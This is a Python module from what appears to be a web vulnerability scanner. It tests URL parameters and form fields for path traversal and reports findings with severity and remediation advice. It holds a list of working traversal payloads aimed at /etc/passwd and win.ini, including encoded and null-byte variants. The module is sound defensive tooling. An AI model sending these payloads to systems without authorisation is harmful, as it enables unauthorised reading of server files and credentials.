import httpx
from typing import List
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.http import get_url_params, inject_url_param, fetch

PAYLOADS = [
    "../../../../etc/passwd",
    "../../../../etc/passwd%00",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "../../../../windows/win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
]

UNIX_SIGNATURES = ["root:x:", "root:/root:", "/bin/bash", "/bin/sh", "daemon:x:"]
WIN_SIGNATURES = ["[extensions]", "[fonts]", "[mci extensions]", "for 16-bit app support"]


def test(page: CrawlResult, client: httpx.Client) -> List[Finding]:
    findings = []
    _test_url_params(page, client, findings)
    _test_forms(page, client, findings)
    return findings


def _test_url_params(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    params = get_url_params(page.url)
    for param_name in params:
        for payload in PAYLOADS:
            test_url = inject_url_param(page.url, param_name, payload)
            resp = fetch(client, "get", test_url)
            if resp and _matches(resp.text):
                findings.append(_finding(page.url, param_name, payload, resp.text))
                break


def _test_forms(page: CrawlResult, client: httpx.Client, findings: List[Finding]):
    for form in page.forms:
        input_names = [i["name"] for i in form["inputs"] if i["name"]]
        if not input_names:
            continue
        for payload in PAYLOADS:
            data = {name: payload for name in input_names}
            resp = fetch(client, form["method"], form["action"], data)
            if resp and _matches(resp.text):
                findings.append(_finding(form["action"], input_names[0], payload, resp.text))
                break


def _matches(body: str) -> bool:
    return any(s in body for s in UNIX_SIGNATURES + WIN_SIGNATURES)


def _finding(url: str, param: str, payload: str, body: str) -> Finding:
    system = "Windows" if any(s in body for s in WIN_SIGNATURES) else "Unix/Linux"
    return Finding(
        title=f"Path Traversal / Directory Traversal ({system})",
        severity=Severity.HIGH,
        url=url,
        parameter=param,
        payload=payload,
        evidence=f"System file content detected in response ({system} signatures matched)",
        description=(
            "Path traversal allows attackers to read arbitrary files on the server filesystem, "
            "including configuration files, credentials, and source code."
        ),
        remediation=(
            "Validate and sanitize all file path inputs. Use an allowlist of permitted paths. "
            "Resolve canonical paths and verify they are within the intended directory."
        ),
        cwe="CWE-22",
        cvss=7.5,
        owasp_category="A01:2021 Broken Access Control",
        standards=["ISO27001-8.23", "HIPAA-164.312a"],
        confidence=1.0,
    )
